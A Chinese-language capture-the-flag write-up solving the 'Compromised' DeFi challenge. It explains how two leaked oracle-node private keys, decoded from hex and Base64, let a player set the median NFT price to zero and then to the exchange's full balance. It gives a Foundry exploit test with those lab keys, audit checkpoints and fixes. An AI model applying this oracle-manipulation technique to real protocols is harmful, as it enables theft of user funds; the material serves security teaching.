# Compromised 

## 一、题目简介

项目上线了基于 DVNFT 的 NFT 交易交易所，价格由链上预言机 `TrustfulOracle` 决定。预言机采用**三可信节点中位数报价机制**，三个授权节点可自主上报 NFT 价格，交易所完全采信预言机价格完成 NFT 买卖交易。

攻击者初始仅持有 **0\.1 ETH**，交易所存有大量 ETH。题目给出服务器泄露的两段十六进制密文，核心考点为**预言机可信节点私钥泄露导致价格操纵**，目标是掏空交易所全部资金并转入回收账户。

题目：  
你在浏览圈内一个热门 DeFi 项目的网页服务时，从服务器收到了一段奇怪的返回信息，以下是返回片段：
```plaintext
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
```
该项目配套的链上交易所正在售卖一款名为「DVNFT」的收藏品，当前标价高达 999 ETH 一枚。
售价从链上预言机获取，价格由三位可信报价管理员上报得出，三个管理员地址分别是：0x188...088、0xA41...9D8、0xab3...a40。
你的初始账户仅有 0.1 ETH 余额，需要完成挑战：盗走交易所内全部 ETH，并将所有盗取的资金转入指定的回收账户，即可通关。

## 二、审计视角

### 1\. 核心代码1：可信节点无风控报价

预言机仅做角色权限校验，无任何价格波动、数值范围限制，可信节点可任意修改价格。

```solidity
function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) {
    _setPrice(msg.sender, symbol, newPrice);
}
```

漏洞细节：只要拥有可信节点权限，可将 NFT 价格随意改为 0、合约全部余额、极大值，无任何风控拦截。

### 2\. 核心代码2：中位数价格算法漏洞

三节点预言机，仅需控制 **2/3 节点** 即可完全掌控中位数价格。

```solidity
function _computeMedianPrice(string memory symbol) private view returns (uint256) {
    uint256[] memory prices = getAllPricesForSymbol(symbol);
    LibSort.insertionSort(prices);
    if (prices.length % 2 == 0) {
        uint256 leftPrice = prices[(prices.length / 2) - 1];
        uint256 rightPrice = prices[prices.length / 2];
        return (leftPrice + rightPrice) / 2;
    } else {
        return prices[prices.length / 2];
    }
}
```

漏洞细节：3个节点报价排序后取中间值，控制任意两个节点即可篡改最终生效价格。

### 3\. 核心代码3：交易所无条件信任预言机

交易所买卖 NFT 的价格完全依赖预言机，无自研价格校验、无价格熔断、无波动限制。

```solidity
// 买入价格校验
uint256 price = oracle.getMedianPrice(token.symbol());
if (msg.value < price) {
    revert InvalidPayment();
}

// 卖出价格校验
uint256 price = oracle.getMedianPrice(token.symbol());
if (address(this).balance < price) {
    revert NotEnoughFunds();
}
```

## 三、开发者默认安全假设

1. **默认可信节点私钥绝对安全**：开发者认为官方节点不会被入侵、私钥不会泄露，未做任何兜底风控。

2. **默认多节点中位数绝对安全**：误以为3节点冗余可以抵御攻击，忽略 2/3 节点受控即可完全控价。

3. **默认预言机报价可信**：交易所完全依赖外部预言机，无本地价格校验、无熔断机制。

4. **默认价格不会恶意篡改**：未限制单次价格修改幅度、无价格上下限、无时间加权校验。

## 四、同类项目通用审计盯点

1. **预言机权限审计**：所有报价节点、管理员账户是否存在私钥泄露、权限过大问题。

2. **中位数预言机通用漏洞**：节点数量为 N 时，控制半数以上节点即可操控价格。

3. **价格风控必查**：是否存在价格熔断、最大波动限制、TWAP 时间加权平均价格校验。

4. **外部依赖风险**：合约核心资产逻辑（买卖、清算）不能完全依赖单一外部预言机。

5. **管理员/节点操作日志**：无作恶惩罚、无权限撤销、无紧急暂停机制均属于高危漏洞。

## 五、完整解题思路

1. **解密获取权限**：将题目泄露的两段十六进制密文，经过 Hex 解码 \+ Base64 解码，获取两个可信预言机节点的真实私钥。

2. **篡改低价**：使用两个受控节点将 NFT 价格改为 0，玩家仅用极少 ETH（0\.1ETH）免费买入 NFT。

3. **篡改高价**：再次操控两个预言机，将 NFT 价格改为交易所全部余额。

4. **套利掏空资金**：玩家授权 NFT 给交易所，高价卖出 NFT，掏空交易所所有 ETH。

5. **完成通关**：将套利所得全部资金转入官方 recovery 回收账户。

## 六、报错复盘

### 报错1：AccessControlUnauthorizedAccount 权限不足

**报错原因**：前期解码逻辑错误，仅单层解码，获取到伪造私钥，对应地址并非官方可信报价节点，无 `TRUSTED_SOURCE_ROLE` 角色，无法调用 `postPrice`。

**解决方案**：采用双层解码（Hex→Base64→私钥），获取题目原生真实私钥。

### 报错2：staticcall`s are not allowed after broadcast

**报错原因**：Foundry 语法限制，`vm.broadcast()` 为单指令广播，执行后**禁止读取链上静态数据（staticcall）**，代码中在 broadcast 后调用 `nft.symbol()` 触发报错。

**解决方案**：1\. 提前读取链上数据；2\. 替换单指令 `broadcast` 为区间模式 `startBroadcast / stopBroadcast`。

### 报错3：地址校验和错误

**报错原因**：手动硬编码地址大小写不规范，不符合 Solidity EIP\-55 校验和规范，编译失败。

**解决方案**：放弃硬编码地址，通过私钥 `vm.addr()` 生成地址，规避格式错误。

## 七、EXP

```solidity
function test_compromised() public checkSolvedByPlayer {
    uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
    uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

    address source1 = vm.addr(pk1);  
    address source2 = vm.addr(pk2);  
    string memory sym = nft.symbol();

    // 压价买入 
    // 控制2个节点，将中位数砸到0
    vm.prank(source1);
    oracle.postPrice(sym, 0);
    
    vm.prank(source2);
    oracle.postPrice(sym, 0);

    // 玩家白嫖买入（price=0，0.1 ETH绰绰有余）
    vm.prank(player);
    uint256 tokenId = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();

    // 抬价卖出 
    // 将价格拉到交易所全部余额
    vm.prank(source1);
    oracle.postPrice(sym, EXCHANGE_INITIAL_ETH_BALANCE);
    
    vm.prank(source2);
    oracle.postPrice(sym, EXCHANGE_INITIAL_ETH_BALANCE);

    // 授权并卖出，掏空交易所
    vm.startPrank(player);
    nft.approve(address(exchange), tokenId);
    exchange.sellOne(tokenId);
    
    // 资金归集
    // 全部转入回收账户
    payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
    vm.stopPrank();
}
```

## 八、合约修复方案

1. **增加价格风控**：限制单次价格修改幅度（如单次浮动不超过10%），禁止价格归零、暴涨暴跌。

2. **优化预言机算法**：引入 TWAP 时间加权平均价格，替代瞬时中位数报价，抵抗瞬时价格操纵。

3. **增加权限管控**：新增节点权限撤销、作恶节点黑名单机制。

4. **增加熔断机制**：价格异常波动时，自动暂停交易所买卖功能。

5. **多重价格校验**：交易所结合多预言机、链下数据源交叉校验，不单一依赖外部合约。
